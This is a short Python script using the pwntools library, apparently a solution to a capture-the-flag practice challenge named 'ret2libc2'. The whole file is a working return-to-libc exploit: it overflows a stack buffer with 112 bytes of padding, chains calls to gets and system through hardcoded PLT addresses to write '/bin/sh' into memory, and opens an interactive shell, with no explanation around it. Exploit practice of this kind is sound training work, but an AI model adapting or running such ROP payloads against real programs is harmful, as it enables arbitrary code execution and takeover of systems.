from pwn import *
shell = process('./ret2libc2')
gets_plt = 0x8048460
system_plt = 0x8048490
pop_ebx = 0x804843d
buf2 = 0x804a080
payload = flat([b'a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])
shell.sendline(payload)
shell.sendline(b'/bin/sh')
shell.interactive()
